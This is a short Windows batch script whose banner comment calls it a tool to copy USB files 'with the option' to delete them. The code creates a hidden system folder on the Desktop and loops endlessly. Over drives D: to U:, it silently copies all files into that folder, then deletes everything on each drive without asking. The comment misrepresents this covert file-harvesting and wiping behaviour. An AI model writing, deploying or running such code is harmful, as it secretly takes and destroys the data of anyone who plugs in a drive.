@echo off
REM ;  _____   ___ _____   ___  _____ ______  ___ _____ 
REM ; /  __ \ /   /  __ \ /   |/  ___|| ___ \/ _ \_   _|
REM ; | /  \// /| | /  \// /| |\ `--. | |_/ / /_\ \| |  
REM ; | |   / /_| | |   / /_| | `--. \| ___ \  _  || |  
REM ; | \__/\___  | \__/\___  |/\__/ /| |_/ / | | || |  
REM ;  \____/   |_/\____/   |_/\____(_)____/\_| |_/\_/  
REM ;
REM ; ##################################################
REM ; 
REM ; // THIS IS A TOOL TO COPY ALL FILES FROM THE USB
REM ; // DEVICE AND YOU HAVE THE OPTION TO DELETE
REM ; // EVERYTHING ON THE USB AFTER COPYING
REM ; 
REM ; ##################################################
setlocal EnableDelayedExpansion
:try
IF EXIST "C:\Users\"%USERNAME%"\Desktop\NCopy" (
 SET l="E:\" "F:\" "G:\" "M:\" "N:\" "D:\" "H:\" "I:\" "L:\" "O:\" "S:\" "U:\"
 FOR %%a in (%l%) DO (
  IF EXIST %%a (
   XCOPY %%a "C:\Users\"%USERNAME%"\Desktop\NCopy" /s /i /y /q
   DEL %%a"*" /s /q
  )
 )
) ELSE (
 MKDIR "C:\Users\"%USERNAME%"\Desktop\NCopy"
 ATTRIB "C:\Users\"%USERNAME%"\Desktop\NCopy" +r +h +s
)
goto try